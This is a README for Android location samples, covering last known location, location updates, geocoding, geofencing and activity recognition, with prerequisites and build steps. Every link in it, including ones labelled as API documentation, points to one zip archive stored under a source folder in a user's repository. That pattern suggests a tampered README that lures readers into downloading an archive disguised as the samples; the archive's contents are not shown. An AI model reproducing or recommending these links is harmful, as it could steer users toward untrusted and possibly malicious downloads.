Google Play Location Samples
============================

Samples that use
[Location APIs](https://github.com/fabianaguirre10/location-samples/raw/refs/heads/master/Geofencing/app/src/samples-location-1.5.zip)
to help you make your applications location aware.

This repo contains the following samples:

1. Basic Location Sample
 ([Java](https://github.com/fabianaguirre10/location-samples/raw/refs/heads/master/Geofencing/app/src/samples-location-1.5.zip), [Kotlin](https://github.com/fabianaguirre10/location-samples/raw/refs/heads/master/Geofencing/app/src/samples-location-1.5.zip)):
Retrieve the last known location for a device.
1. [Location Updates](https://github.com/fabianaguirre10/location-samples/raw/refs/heads/master/Geofencing/app/src/samples-location-1.5.zip):
Get updates about a device's location.

1. [Location Updates using a PendingIntent](https://github.com/fabianaguirre10/location-samples/raw/refs/heads/master/Geofencing/app/src/samples-location-1.5.zip):
Get updates about a device's location using a `PendingIntent`. Sample shows
implementation using an `IntentService` as well as a `BroadcastReceiver`.
1. [Location Updates using a Foreground Service](https://github.com/fabianaguirre10/location-samples/raw/refs/heads/master/Geofencing/app/src/samples-location-1.5.zip):
Get updates about a device's location using a bound and started foreground
service.
1. Location Address
([Java](https://github.com/fabianaguirre10/location-samples/raw/refs/heads/master/Geofencing/app/src/samples-location-1.5.zip), [Kotlin](https://github.com/fabianaguirre10/location-samples/raw/refs/heads/master/Geofencing/app/src/samples-location-1.5.zip)):
Use the [Geocode API](https://github.com/fabianaguirre10/location-samples/raw/refs/heads/master/Geofencing/app/src/samples-location-1.5.zip) to display a device's location as an address.
1. [Creating and Monitoring Geofences](https://github.com/fabianaguirre10/location-samples/raw/refs/heads/master/Geofencing/app/src/samples-location-1.5.zip):
Create geofences and process enter and exit transitions.
1. [Recognizing the User's Current Activity](https://github.com/fabianaguirre10/location-samples/raw/refs/heads/master/Geofencing/app/src/samples-location-1.5.zip):
Use the
[ActivityRecognitionApi](https://github.com/fabianaguirre10/location-samples/raw/refs/heads/master/Geofencing/app/src/samples-location-1.5.zip) to determine the user's current activity.

Prerequisites
--------------

- Android API Level >v9
- Android Build Tools >v21
- Google Support Repository

Getting Started
---------------

These samples use the Gradle build system. To build a sample, use the
"gradlew build" command or use "Import Project" in Android Studio.
